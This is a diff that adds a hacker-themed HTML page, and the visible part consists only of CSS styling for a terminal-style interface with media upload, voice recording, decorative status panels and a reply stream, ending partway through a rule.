@@ -1,0 +1,3595 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#000000">
+    <title>SYSTEM_CORE v5.2</title>
+    <style>
+/* ===== RESET & BASE ===== */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body, html {
+    height: 100%;
+    background-color: #000;
+    overflow: hidden;
+    font-family: 'Courier New', 'Consolas', 'Monaco', monospace;
+    color: #00ff41;
+}
+
+/* ===== MATRIX BACKGROUND ===== */
+#matrixCanvas {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: -2;
+    opacity: 0.15;
+}
+
+.scanline {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(
+        to bottom,
+        rgba(255, 255, 255, 0) 50%,
+        rgba(0, 255, 65, 0.02) 50%
+    );
+    background-size: 100% 4px;
+    z-index: -1;
+    pointer-events: none;
+    animation: scan 8s linear infinite;
+}
+
+@keyframes scan {
+    0% { transform: translateY(-100%); }
+    100% { transform: translateY(100%); }
+}
+
+/* ===== MAIN TERMINAL ===== */
+.terminal-box {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    width: 90%;
+    max-width: 800px;
+    background: rgba(0, 15, 0, 0.92);
+    border: 2px solid #00ff41;
+    border-radius: 4px;
+    padding: 25px;
+    box-shadow: 
+        0 0 30px rgba(0, 255, 65, 0.4),
+        inset 0 0 20px rgba(0, 255, 65, 0.1);
+    backdrop-filter: blur(5px);
+    z-index: 10;
+}
+
+.header {
+    color: #00ff41;
+    font-size: 14px;
+    margin-bottom: 15px;
+    padding-bottom: 10px;
+    border-bottom: 1px solid #00ff41;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+}
+
+.pulse {
+    animation: pulse 1.5s infinite;
+    color: #ff0000;
+    margin-right: 8px;
+    font-size: 12px;
+}
+
+@keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.3; }
+}
+
+.status-indicator {
+    font-size: 11px;
+    color: #00ff00;
+    background: rgba(0, 255, 0, 0.1);
+    padding: 3px 8px;
+    border-radius: 3px;
+    border: 1px solid #00ff00;
+}
+
+.console-log {
+    font-size: 11px;
+    color: #008f11;
+    margin-bottom: 20px;
+    line-height: 1.5;
+    background: rgba(0, 20, 0, 0.5);
+    padding: 10px;
+    border: 1px solid #005500;
+    border-radius: 3px;
+    max-height: 100px;
+    overflow-y: auto;
+}
+
+/* ===== TEXTAREA ===== */
+.typer-wrapper {
+    position: relative;
+    margin-bottom: 20px;
+}
+
+#hackerTyper {
+    width: 100%;
+    height: 150px;
+    background: rgba(0, 25, 0, 0.9);
+    border: 2px solid #00aa00;
+    color: #00ff41;
+    padding: 15px;
+    outline: none;
+    resize: none;
+    font-family: inherit;
+    font-size: 13px;
+    line-height: 1.4;
+    border-radius: 3px;
+    transition: all 0.3s;
+}
+
+#hackerTyper:focus {
+    border-color: #00ff41;
+    box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
+}
+
+.char-counter {
+    position: absolute;
+    bottom: 5px;
+    right: 10px;
+    font-size: 10px;
+    color: #00aa00;
+    background: rgba(0, 0, 0, 0.7);
+    padding: 2px 6px;
+    border-radius: 2px;
+}
+
+/* ===== PREVIEW SECTION ===== */
+.preview-section {
+    margin-bottom: 20px;
+}
+
+.section-header {
+    color: #00ff41;
+    font-size: 12px;
+    margin-bottom: 8px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+}
+
+.preview-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(60px, 1fr));
+    gap: 10px;
+    max-height: 120px;
+    overflow-y: auto;
+    padding: 10px;
+    background: rgba(0, 20, 0, 0.3);
+    border: 1px solid #005500;
+    border-radius: 3px;
+}
+
+.preview-item {
+    width: 60px;
+    height: 60px;
+    border: 1px solid #00aa00;
+    object-fit: cover;
+    opacity: 0.8;
+    transition: all 0.3s;
+    border-radius: 2px;
+}
+
+.preview-item:hover {
+    opacity: 1;
+    border-color: #00ff41;
+    transform: scale(1.05);
+}
+
+/* ===== ACTION BUTTONS ===== */
+.action-row {
+    display: flex;
+    gap: 12px;
+    margin-top: 20px;
+    margin-bottom: 20px;
+}
+
+.hacker-btn {
+    border: 1px solid #00ff41;
+    color: #00ff41;
+    background: transparent;
+    padding: 12px 20px;
+    cursor: pointer;
+    font-size: 12px;
+    flex: 1;
+    text-align: center;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    transition: all 0.3s;
+    border-radius: 3px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    font-family: inherit;
+}
+
+.hacker-btn:hover {
+    background: #00ff41;
+    color: #000;
+    box-shadow: 0 0 10px #00ff41;
+}
+
+.hacker-btn.secondary {
+    border-color: #ff9900;
+    color: #ff9900;
+    flex: 0.7;
+}
+
+.hacker-btn.secondary:hover {
+    background: #ff9900;
+    color: #000;
+    box-shadow: 0 0 10px #ff9900;
+}
+
+/* EXECUTE/SEND BUTTON - NO ANIMATIONS */
+.hacker-btn.execute {
+    border-color: #ff0000;
+    color: #ff0000;
+    font-weight: bold;
+    /* NO GLOW ANIMATION */
+    transition: all 0.3s;
+}
+
+.hacker-btn.execute:hover {
+    background: #ff0000;
+    color: #000;
+    box-shadow: 0 0 10px #ff0000;
+    /* NO ANIMATION ON HOVER */
+}
+
+/* ===== LOADER & PROGRESS ===== */
+#loader-container {
+    margin-top: 20px;
+    display: none;
+}
+
+#loader-text {
+    font-size: 12px;
+    color: #00ff41;
+    margin-bottom: 10px;
+    text-align: center;
+}
+
+.progress-bar {
+    width: 100%;
+    height: 8px;
+    background: #002200;
+    position: relative;
+    border-radius: 4px;
+    overflow: hidden;
+    margin-bottom: 15px;
+    border: 1px solid #005500;
+}
+
+.progress-fill {
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, #003300, #00ff41);
+    position: absolute;
+    transition: width 0.5s ease;
+}
+
+.progress-text {
+    position: absolute;
+    right: 10px;
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 9px;
+    color: #00ff41;
+    text-shadow: 0 0 3px #000;
+}
+
+.encryption-status {
+    font-size: 11px;
+    color: #00aaff;
+    text-align: center;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    background: rgba(0, 40, 80, 0.2);
+    padding: 5px;
+    border-radius: 3px;
+    border: 1px solid #00aaff;
+}
+
+/* ===== DIAGNOSTIC PANEL ===== */
+.diagnostic-panel {
+    position: fixed;
+    top: 20px;
+    right: 20px;
+    width: 350px;
+    background: rgba(0, 20, 0, 0.95);
+    border: 2px solid #ff3333;
+    border-radius: 4px;
+    font-size: 11px;
+    color: #ff3333;
+    z-index: 50;
+    box-shadow: 0 0 20px rgba(255, 51, 51, 0.3);
+    transition: transform 0.3s;
+}
+
+.panel-header {
+    background: rgba(255, 0, 0, 0.1);
+    padding: 10px 15px;
+    border-bottom: 1px solid #ff3333;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-weight: bold;
+    text-transform: uppercase;
+}
+
+.panel-close {
+    cursor: pointer;
+    color: #ff9999;
+    font-size: 14px;
+}
+
+.panel-close:hover {
+    color: #fff;
+}
+
+.panel-content {
+    padding: 15px;
+    max-height: 400px;
+    overflow-y: auto;
+}
+
+.log-line {
+    margin-bottom: 8px;
+    padding-bottom: 8px;
+    border-bottom: 1px dashed rgba(255, 51, 51, 0.3);
+}
+
+.log-time {
+    color: #ff9999;
+    margin-right: 10px;
+}
+
+.config-display {
+    background: rgba(0, 0, 0, 0.5);
+    padding: 10px;
+    margin: 10px 0;
+    border: 1px solid #ff9900;
+    border-radius: 3px;
+    font-family: 'Courier New', monospace;
+}
+
+.config-line {
+    display: flex;
+    margin: 5px 0;
+    align-items: center;
+}
+
+.var-name {
+    color: #00ff00;
+    min-width: 140px;
+    font-weight: bold;
+}
+
+.equals {
+    color: #ffffff;
+    margin: 0 10px;
+}
+
+.var-value {
+    color: #ff9900;
+    font-family: 'Courier New', monospace;
+    word-break: break-all;
+}
+
+.system-metrics {
+    margin-top: 15px;
+}
+
+.metric {
+    display: flex;
+    align-items: center;
+    margin-bottom: 8px;
+    gap: 10px;
+}
+
+.metric-label {
+    min-width: 40px;
+    color: #00aaff;
+}
+
+.metric-bar {
+    flex: 1;
+    height: 6px;
+    background: #002244;
+    border-radius: 3px;
+    overflow: hidden;
+}
+
+.metric-fill {
+    height: 100%;
+    background: linear-gradient(90deg, #0044aa, #00aaff);
+    border-radius: 3px;
+}
+
+.metric-value {
+    min-width: 40px;
+    text-align: right;
+    color: #00ffff;
+}
+
+/* ===== MEMORY WINDOW ===== */
+.memory-window {
+    position: fixed;
+    bottom: 20px;
+    left: 20px;
+    width: 300px;
+    background: rgba(10, 0, 20, 0.95);
+    border: 2px solid #00ffff;
+    border-radius: 4px;
+    font-family: 'Courier New', monospace;
+    font-size: 10px;
+    color: #00ffff;
+    z-index: 50;
+    box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
+}
+
+.window-header {
+    background: rgba(0, 100, 255, 0.1);
+    padding: 10px 15px;
+    border-bottom: 1px solid #00ffff;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-weight: bold;
+}
+
+.window-content {
+    padding: 15px;
+    max-height: 200px;
+    overflow-y: auto;
+    line-height: 1.6;
+}
+
+.mem-line {
+    margin-bottom: 5px;
+    font-family: 'Courier New', monospace;
+}
+
+.mem-address {
+    color: #ff00ff;
+    margin-right: 10px;
+}
+
+.mem-data {
+    color: #00ff00;
+}
+
+.mem-ascii {
+    color: #ffff00;
+    margin-left: 20px;
+}
+
+.memory-footer {
+    padding: 8px 15px;
+    border-top: 1px solid #00ffff;
+    display: flex;
+    justify-content: space-between;
+    font-size: 9px;
+    background: rgba(0, 0, 0, 0.3);
+}
+
+.mem-status {
+    color: #ff9900;
+}
+
+/* ===== PACKET STREAM ===== */
+.packet-stream {
+    position: fixed;
+    top: 50%;
+    right: 20px;
+    transform: translateY(-50%);
+    width: 320px;
+    background: rgba(0, 0, 30, 0.95);
+    border: 2px solid #ffff00;
+    border-radius: 4px;
+    color: #ffff00;
+    z-index: 50;
+    box-shadow: 0 0 20px rgba(255, 255, 0, 0.3);
+}
+
+.stream-header {
+    background: rgba(255, 255, 0, 0.1);
+    padding: 10px 15px;
+    border-bottom: 1px solid #ffff00;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-weight: bold;
+}
+
+.stream-content {
+    padding: 15px;
+    max-height: 300px;
+    overflow-y: auto;
+}
+
+.packet-line {
+    margin-bottom: 8px;
+    padding: 5px;
+    background: rgba(255, 255, 0, 0.05);
+    border-left: 2px solid #ffff00;
+    font-family: 'Courier New', monospace;
+    font-size: 10px;
+    animation: packetIn 0.5s ease;
+}
+
+@keyframes packetIn {
+    from {
+        opacity: 0;
+        transform: translateX(20px);
+    }
+    to {
+        opacity: 1;
+        transform: translateX(0);
+    }
+}
+
+.stream-footer {
+    padding: 8px 15px;
+    border-top: 1px solid #ffff00;
+    display: flex;
+    justify-content: space-between;
+    font-size: 9px;
+    background: rgba(0, 0, 0, 0.3);
+}
+
+.encryption-indicator {
+    color: #00ff00;
+}
+
+/* ===== COMMAND HISTORY ===== */
+.command-history {
+    position: fixed;
+    top: 20px;
+    left: 20px;
+    width: 300px;
+    background: rgba(20, 0, 10, 0.95);
+    border: 2px solid #ff00ff;
+    border-radius: 4px;
+    color: #ff00ff;
+    z-index: 50;
+    box-shadow: 0 0 20px rgba(255, 0, 255, 0.3);
+}
+
+.history-header {
+    background: rgba(255, 0, 255, 0.1);
+    padding: 10px 15px;
+    border-bottom: 1px solid #ff00ff;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-weight: bold;
+}
+
+.history-content {
+    padding: 15px;
+    max-height: 400px;
+    overflow-y: auto;
+    font-family: 'Courier New', monospace;
+    font-size: 11px;
+}
+
+.cmd-line {
+    margin-bottom: 5px;
+    padding: 3px 0;
+    border-bottom: 1px dashed rgba(255, 0, 255, 0.2);
+}
+
+.cmd-prompt {
+    color: #00ffff;
+    margin-right: 8px;
+}
+
+.cmd-text {
+    color: #ff00ff;
+}
+
+.cmd-output {
+    color: #00ff00;
+    margin-left: 20px;
+    font-style: italic;
+}
+
+/* ===== POPUP NOTIFICATION ===== */
+.popup {
+    position: fixed;
+    right: 20px;
+    bottom: -150px;
+    width: 280px;
+    background: rgba(0, 0, 0, 0.95);
+    border: 2px solid #00ff41;
+    border-radius: 4px;
+    padding: 0;
+    transition: bottom 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    color: #00ff41;
+    z-index: 100;
+    box-shadow: 0 0 30px rgba(0, 255, 65, 0.4);
+}
+
+.popup.show {
+    bottom: 20px;
+}
+
+.popup-header {
+    background: rgba(0, 255, 65, 0.1);
+    padding: 12px 15px;
+    border-bottom: 1px solid #00ff41;
+    font-weight: bold;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+}
+
+.popup-body {
+    padding: 15px;
+    font-size: 12px;
+    line-height: 1.5;
+}
+
+.popup-footer {
+    padding: 8px 15px;
+    border-top: 1px solid #00ff41;
+    display: flex;
+    justify-content: space-between;
+    font-size: 9px;
+    background: rgba(0, 0, 0, 0.3);
+}
+
+.popup-time {
+    color: #00aaff;
+}
+
+/* ===== SECRET OVERLAY ===== */
+.secret-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: #000;
+    color: #ff0000;
+    z-index: 9999;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    font-family: 'Courier New', monospace;
+}
+
+.secret-overlay.active {
+    display: flex;
+    animation: glitchEffect 0.3s infinite;
+}
+
+@keyframes glitchEffect {
+    0% { transform: translate(0); }
+    20% { transform: translate(-2px, 2px); }
+    40% { transform: translate(-2px, -2px); }
+    60% { transform: translate(2px, 2px); }
+    80% { transform: translate(2px, -2px); }
+    100% { transform: translate(0); }
+}
+
+.secret-content {
+    background: rgba(0, 0, 0, 0.9);
+    border: 3px solid #ff0000;
+    padding: 30px;
+    max-width: 800px;
+    width: 90%;
+    box-shadow: 0 0 50px #ff0000;
+    text-align: center;
+}
+
+.secret-header {
+    font-size: 24px;
+    margin-bottom: 30px;
+    color: #ff0000;
+    text-shadow: 0 0 10px #ff0000;
+}
+
+.secret-body {
+    font-size: 11px;
+    line-height: 1.8;
+    margin-bottom: 30px;
+    text-align: left;
+    background: #111;
+    padding: 20px;
+    border: 1px solid #ff0000;
+    max-height: 400px;
+    overflow-y: auto;
+}
+
+.secret-footer {
+    font-size: 14px;
+    color: #ff0000;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+}
+
+.countdown {
+    font-size: 24px;
+    font-weight: bold;
+    color: #ff0000;
+    animation: countdownPulse 1s infinite;
+}
+
+@keyframes countdownPulse {
+    0%, 100% { transform: scale(1); }
+    50% { transform: scale(1.2); }
+}
+
+/* ===== UTILITY CLASSES ===== */
+.blink {
+    animation: blink 1s infinite;
+}
+
+@keyframes blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.3; }
+}
+
+/* GLITCH ACTIVE CLASS REMOVED - NO TERMINAL ANIMATION */
+/* .glitch-active {
+    animation: terminalGlitch 0.2s infinite;
+} */
+
+/* ===== SCROLLBAR STYLING ===== */
+::-webkit-scrollbar {
+    width: 8px;
+    height: 8px;
+}
+
+::-webkit-scrollbar-track {
+    background: rgba(0, 20, 0, 0.5);
+    border-radius: 4px;
+}
+
+::-webkit-scrollbar-thumb {
+    background: #00aa00;
+    border-radius: 4px;
+}
+
+::-webkit-scrollbar-thumb:hover {
+    background: #00ff41;
+}
+
+/* ===== RESPONSIVE DESIGN ===== */
+@media (max-width: 1200px) {
+    .diagnostic-panel,
+    .command-history,
+    .memory-window,
+    .packet-stream {
+        width: 250px;
+        font-size: 10px;
+    }
+    
+    .terminal-box {
+        max-width: 700px;
+    }
+}
+
+@media (max-width: 768px) {
+    .terminal-box {
+        width: 95%;
+        padding: 15px;
+        top: 50%;
+        transform: translate(-50%, -50%);
+    }
+    
+    .action-row {
+        flex-direction: column;
+    }
+    
+    .diagnostic-panel,
+    .command-history,
+    .memory-window,
+    .packet-stream {
+        position: relative;
+        width: 100%;
+        margin: 10px 0;
+        top: auto;
+        left: auto;
+        right: auto;
+        bottom: auto;
+        transform: none;
+    }
+    
+    #terminalBox {
+        position: relative;
+        top: auto;
+        left: auto;
+        transform: none;
+        margin: 20px auto;
+    }
+}
+
+/* =====================================================================
+   v2 ADDITIONS: file previews, drag & drop, touch targets, mobile layout
+   ===================================================================== */
+
+/* Hide native file inputs; labels open them */
+#fileInput,
+#cameraInput {
+    display: none;
+}
+
+button, .hacker-btn {
+    -webkit-tap-highlight-color: transparent;
+    touch-action: manipulation;
+}
+
+/* Desktop: never let the terminal outgrow the screen */
+.terminal-box {
+    max-height: 94vh;
+    max-height: 94dvh;
+    overflow-y: auto;
+}
+
+.terminal-box.drag-over {
+    border-color: #ffff00;
+    box-shadow: 0 0 40px rgba(255, 255, 0, 0.5), inset 0 0 20px rgba(255, 255, 0, 0.15);
+}
+
+/* ----- Media buffer ----- */
+.media-count {
+    margin-left: auto;
+    color: #00aa00;
+    font-size: 11px;
+}
+
+.preview-grid {
+    grid-template-columns: repeat(auto-fill, minmax(84px, 1fr));
+    max-height: 230px;
+}
+
+.preview-grid:empty {
+    display: block;
+}
+
+.preview-grid:empty::before {
+    content: 'DROP / PASTE / SELECT FILES';
+    display: block;
+    text-align: center;
+    color: #007700;
+    font-size: 11px;
+    letter-spacing: 1px;
+    padding: 14px 0;
+}
+
+.preview-item-container {
+    position: relative;
+    display: flex;
+    flex-direction: column;
+    gap: 3px;
+    min-width: 0;
+}
+
+.preview-thumb {
+    position: relative;
+    width: 100%;
+    aspect-ratio: 1;
+    border: 1px solid #00aa00;
+    border-radius: 2px;
+    overflow: hidden;
+    background: #002200;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+}
+
+.preview-img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    opacity: 0.85;
+    display: block;
+}
+
+.preview-thumb.is-file {
+    color: #00ff41;
+    font-size: 24px;
+    gap: 4px;
+}
+
+.preview-ext {
+    font-size: 9px;
+    letter-spacing: 1px;
+    color: #00aa00;
+}
+
+.preview-badge {
+    position: absolute;
+    left: 5px;
+    bottom: 5px;
+    font-size: 10px;
+    color: #00ff41;
+    text-shadow: 0 0 3px #000;
+}
+
+.preview-name,
+.preview-size {
+    font-size: 9px;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+}
+
+.preview-name { color: #00cc33; }
+.preview-size { color: #008f11; }
+
+.preview-remove {
+    position: absolute;
+    top: -7px;
+    right: -7px;
+    width: 24px;
+    height: 24px;
+    border-radius: 50%;
+    border: 1px solid #ff3333;
+    background: #000;
+    color: #ff3333;
+    font-family: inherit;
+    font-size: 16px;
+    line-height: 1;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 2;
+}
+
+/* bigger invisible hit area for fingers */
+.preview-remove::after {
+    content: '';
+    position: absolute;
+    inset: -10px;
+}
+
+.preview-remove:hover,
+.preview-remove:active {
+    background: #ff3333;
+    color: #000;
+}
+
+/* ----- Buttons ----- */
+.hacker-btn {
+    min-height: 44px;
+    user-select: none;
+}
+
+.hacker-btn:active {
+    background: #00ff41;
+    color: #000;
+}
+
+.hacker-btn.secondary:active {
+    background: #ff9900;
+    color: #000;
+}
+
+.hacker-btn.execute:active {
+    background: #ff0000;
+    color: #000;
+}
+
+.hacker-btn:disabled,
+.action-row.busy label.hacker-btn {
+    opacity: 0.45;
+    cursor: not-allowed;
+    pointer-events: none;
+}
+
+#hackerTyper:read-only {
+    opacity: 0.7;
+}
+
+/* ===== Mobile ===== */
+@media (max-width: 768px) {
+    /* the page must scroll on phones (panels/preview can be taller than the screen) */
+    html, body {
+        height: auto;
+        min-height: 100%;
+        overflow-x: hidden;
+        overflow-y: auto;
+    }
+
+    .terminal-box,
+    #terminalBox {
+        position: relative;
+        top: auto;
+        left: auto;
+        transform: none;
+        width: calc(100% - 20px);
+        max-width: none;
+        max-height: none;
+        overflow: visible;
+        margin: 10px auto;
+        padding: 14px;
+    }
+
+    .header {
+        font-size: 12px;
+        gap: 8px;
+    }
+
+    .console-log {
+        max-height: 70px;
+    }
+
+    /* 16px stops iOS Safari from zooming the page when the textarea is focused */
+    #hackerTyper {
+        height: 120px;
+        font-size: 16px;
+        padding: 12px;
+    }
+
+    .preview-grid {
+        grid-template-columns: repeat(auto-fill, minmax(76px, 1fr));
+        max-height: 250px;
+    }
+
+    .preview-remove {
+        width: 28px;
+        height: 28px;
+        font-size: 18px;
+    }
+
+    /* SELECT_MEDIA + SEND on the first row, TEST + CLEAR below */
+    .action-row {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 10px;
+    }
+
+    .action-row .hacker-btn {
+        flex: none;
+        min-height: 50px;
+        font-size: 13px;
+        padding: 10px 8px;
+    }
+
+    .action-row label.hacker-btn { order: 1; }
+    .action-row .hacker-btn.execute { order: 2; }
+    .action-row .hacker-btn.secondary { order: 3; }
+
+    /* decorative panels sit below the terminal: just scroll down to see them */
+    .diagnostic-panel,
+    .command-history,
+    .memory-window,
+    .packet-stream {
+        width: calc(100% - 20px);
+        margin: 10px auto;
+    }
+
+    body {
+        padding-bottom: calc(20px + env(safe-area-inset-bottom, 0px));
+    }
+
+    .popup {
+        left: 10px;
+        right: 10px;
+        width: auto;
+        bottom: -220px;
+    }
+
+    .popup.show {
+        bottom: calc(10px + env(safe-area-inset-bottom, 0px));
+    }
+
+    .secret-header {
+        font-size: 16px;
+        margin-bottom: 16px;
+    }
+
+    .secret-content {
+        padding: 16px;
+    }
+
+    .secret-body {
+        padding: 10px;
+        overflow-x: auto;
+        max-height: 60vh;
+    }
+}
+
+@media (prefers-reduced-motion: reduce) {
+    .scanline,
+    .pulse,
+    .blink,
+    .countdown {
+        animation: none;
+    }
+}
+
+/* Panel collapse ([−] / [+]) */
+.collapsed > :not(.panel-header):not(.window-header):not(.stream-header):not(.history-header) {
+    display: none;
+}
+
+.panel-close {
+    padding: 2px 6px;
+    user-select: none;
+}
+
+/* ─── Media tools row ──────────────────────────────────────────────────── */
+.media-tools-row {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 8px;
+    margin-bottom: 10px;
+}
+
+.media-tools-row .hacker-btn {
+    justify-content: center;
+    text-align: center;
+    font-size: 12px;
+    padding: 8px 4px;
+    letter-spacing: 0.5px;
+    cursor: pointer;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 4px;
+    min-height: 54px;
+}
+
+.media-tools-row .hacker-btn i {
+    font-size: 18px;
+}
+
+/* "disabled" state for label buttons when sending */
+.media-tools-row label.hacker-btn.disabled,
+.action-row      label.hacker-btn.disabled {
+    opacity: 0.45;
+    pointer-events: none;
+    cursor: not-allowed;
+}
+
+
+/* ----- Buttons ----- */
+.hacker-btn {
+    min-height: 44px;
+    user-select: none;
+}
+
+.hacker-btn:active {
+    background: #00ff41;
+    color: #000;
+}
+
+.hacker-btn.secondary:active {
+    background: #ff9900;
+    color: #000;
+}
+
+.hacker-btn.execute:active {
+    background: #ff0000;
+    color: #000;
+}
+
+.hacker-btn:disabled,
+.action-row.busy label.hacker-btn {
+    opacity: 0.45;
+    cursor: not-allowed;
+    pointer-events: none;
+}
+
+#hackerTyper:read-only {
+    opacity: 0.7;
+}
+
+/* ===== Mobile ===== */
+@media (max-width: 768px) {
+    /* the page must scroll on phones (panels/preview can be taller than the screen) */
+    html, body {
+        height: auto;
+        min-height: 100%;
+        overflow-x: hidden;
+        overflow-y: auto;
+    }
+
+    .terminal-box,
+    #terminalBox {
+        position: relative;
+        top: auto;
+        left: auto;
+        transform: none;
+        width: calc(100% - 20px);
+        max-width: none;
+        max-height: none;
+        overflow: visible;
+        margin: 10px auto;
+        padding: 14px;
+    }
+
+    .header {
+        font-size: 12px;
+        gap: 8px;
+    }
+
+    .console-log {
+        max-height: 70px;
+    }
+
+    /* 16px stops iOS Safari from zooming the page when the textarea is focused */
+    #hackerTyper {
+        height: 120px;
+        font-size: 16px;
+        padding: 12px;
+    }
+
+    .preview-grid {
+        grid-template-columns: repeat(auto-fill, minmax(76px, 1fr));
+        max-height: 250px;
+    }
+
+    .preview-remove {
+        width: 28px;
+        height: 28px;
+        font-size: 18px;
+    }
+
+    /* SELECT_MEDIA + SEND on the first row, TEST + CLEAR below */
+    .action-row {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 10px;
+    }
+
+    .action-row .hacker-btn {
+        flex: none;
+        min-height: 50px;
+        font-size: 13px;
+        padding: 10px 8px;
+    }
+
+    .action-row label.hacker-btn { order: 1; }
+    .action-row .hacker-btn.execute { order: 2; }
+    .action-row .hacker-btn.secondary { order: 3; }
+
+    /* decorative panels sit below the terminal: just scroll down to see them */
+    .diagnostic-panel,
+    .command-history,
+    .memory-window,
+    .packet-stream {
+        width: calc(100% - 20px);
+        margin: 10px auto;
+    }
+
+    body {
+        padding-bottom: calc(20px + env(safe-area-inset-bottom, 0px));
+    }
+
+    .popup {
+        left: 10px;
+        right: 10px;
+        width: auto;
+        bottom: -220px;
+    }
+
+    .popup.show {
+        bottom: calc(10px + env(safe-area-inset-bottom, 0px));
+    }
+
+    .secret-header {
+        font-size: 16px;
+        margin-bottom: 16px;
+    }
+
+    .secret-content {
+        padding: 16px;
+    }
+
+    .secret-body {
+        padding: 10px;
+        overflow-x: auto;
+        max-height: 60vh;
+    }
+}
+
+@media (prefers-reduced-motion: reduce) {
+    .scanline,
+    .pulse,
+    .blink,
+    .countdown {
+        animation: none;
+    }
+}
+
+/* Panel collapse ([−] / [+]) */
+.collapsed > :not(.panel-header):not(.window-header):not(.stream-header):not(.history-header) {
+    display: none;
+}
+
+.panel-close {
+    padding: 2px 6px;
+    user-select: none;
+}
+
+/* ─── Media tools row ──────────────────────────────────────────────────── */
+.media-tools-row {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 8px;
+    margin-bottom: 10px;
+}
+
+.media-tools-row .hacker-btn {
+    justify-content: center;
+    text-align: center;
+    font-size: 12px;
+    padding: 8px 4px;
+    letter-spacing: 0.5px;
+    cursor: pointer;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 4px;
+    min-height: 54px;
+}
+
+.media-tools-row .hacker-btn i {
+    font-size: 18px;
+}
+
+/* "disabled" state for label buttons when sending */
+.media-tools-row label.hacker-btn.disabled,
+.action-row      label.hacker-btn.disabled {
+    opacity: 0.45;
+    pointer-events: none;
+    cursor: not-allowed;
+}
+
+/* Voice recording: pulsing red */
+#voiceBtn.recording {
+    border-color: #ff0000;
+    color: #ff0000;
+    animation: voice-pulse 1s ease-in-out infinite;
+}
+
+@keyframes voice-pulse {
+    0%, 100% { box-shadow: 0 0 4px rgba(255,0,0,0.4); }
+    50%       { box-shadow: 0 0 16px rgba(255,0,0,0.9); }
+}
+
+/* Voice preview thumbnail */
+.preview-thumb.is-voice {
+    color: #00ff41;
+    font-size: 20px;
+    gap: 2px;
+}
+
+.voice-wave {
+    display: flex;
+    align-items: flex-end;
+    gap: 2px;
+    height: 14px;
+    margin-top: 2px;
+}
+
+.voice-wave span {
+    display: inline-block;
+    width: 3px;
+    background: #00ff41;
+    border-radius: 1px;
+    animation: wave-bar 0.9s ease-in-out infinite;
+}
+
+.voice-wave span:nth-child(1) { height: 40%; animation-delay: 0s; }
+.voice-wave span:nth-child(2) { height: 80%; animation-delay: 0.15s; }
+.voice-wave span:nth-child(3) { height: 100%; animation-delay: 0.3s; }
+.voice-wave span:nth-child(4) { height: 70%; animation-delay: 0.45s; }
+.voice-wave span:nth-child(5) { height: 50%; animation-delay: 0.6s; }
+
+@keyframes wave-bar {
+    0%, 100% { transform: scaleY(0.5); }
+    50%       { transform: scaleY(1); }
+}
+
+/* ─── Mobile overrides for new rows ────────────────────────────────────── */
+@media (max-width: 768px) {
+    .media-tools-row {
+        grid-template-columns: repeat(4, 1fr);
+        gap: 6px;
+    }
+
+    .media-tools-row .hacker-btn {
+        font-size: 10px;
+        min-height: 56px;
+        padding: 6px 2px;
+        letter-spacing: 0;
+    }
+
+    .media-tools-row .hacker-btn i {
+        font-size: 16px;
+    }
+
+    .action-row {
+        grid-template-columns: 1fr 1fr 2fr;
+        gap: 8px;
+    }
+
+    .action-row .hacker-btn {
+        flex: none;
+        min-height: 50px;
+    }
+}
+
+/* ===== REPLY STREAM PANEL ===== */
+.reply-stream {
+    background: rgba(0, 10, 0, 0.95);
+    border: 1px solid #004400;
+    border-radius: 4px;
+    font-family: 'Courier New', monospace;
+    box-shadow: 0 0 20px rgba(0,255,0,0.1);
+    overflow: hidden;
+    position: relative;
+}
+
+.reply-stream .stream-header {
+    background: #001a00;
+    border-bottom: 1px solid #004400;
+    padding: 8px 12px;
+    color: #00ff41;
+    font-size: 12px;
+    font-weight: bold;
+    letter-spacing: 2px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    cursor: grab;
+}
+
+.reply-badge {
+    background: #ff0000;
+    color: #fff;
+    border-radius: 10px;
+    padding: 1px 7px;
+    font-size: 11px;
+    font-weight: bold;
+    margin-left: 4px;
+    animation: pulse 1s infinite;
+}
+
+.reply-list {
+    max-height: 280px;
+    overflow-y: auto;
+    padding: 8px;
+    display: flex;
